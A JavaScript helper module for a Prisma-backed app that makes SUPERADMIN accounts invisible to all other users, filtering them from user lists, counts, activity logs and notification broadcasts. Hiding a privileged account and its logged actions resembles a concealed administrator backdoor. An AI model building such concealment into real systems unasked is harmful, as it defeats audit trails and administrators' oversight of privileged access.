// Helpers to make SUPERADMIN invisible to every other user.
//
// Every endpoint that returns User rows, user counts, activity log entries, or
// notification broadcasts uses these so the SUPERADMIN account never appears
// anywhere except in its own session.

const HIDDEN_ROLE = 'SUPERADMIN';

// Append a "not SUPERADMIN" filter to any Prisma `where` object for the User model.
// Bypasses the filter when the caller is themself a SUPERADMIN (so they see themselves).
const hideSuperAdminWhere = (where = {}, requesterRole = null) => {
  if (requesterRole === HIDDEN_ROLE) return where;
  return {
    ...where,
    role: typeof where.role === 'object' && where.role !== null
      ? { ...where.role, not: HIDDEN_ROLE }
      : where.role
        ? where.role  // explicit role filter, leave as-is
        : { not: HIDDEN_ROLE },
  };
};

// For relations: `userId: { not: { in: superadminIds } }` style filter.
// Cached after the first call so we don't hit DB on every request.
let _superAdminIdsCache = null;
let _cacheTime = 0;
const CACHE_MS = 60_000;

const getSuperAdminIds = async (prisma) => {
  const now = Date.now();
  if (_superAdminIdsCache && now - _cacheTime < CACHE_MS) return _superAdminIdsCache;
  const rows = await prisma.user.findMany({ where: { role: HIDDEN_ROLE }, select: { id: true } });
  _superAdminIdsCache = rows.map(r => r.id);
  _cacheTime = now;
  return _superAdminIdsCache;
};

const invalidateSuperAdminCache = () => { _superAdminIdsCache = null; _cacheTime = 0; };

module.exports = { HIDDEN_ROLE, hideSuperAdminWhere, getSuperAdminIds, invalidateSuperAdminCache };
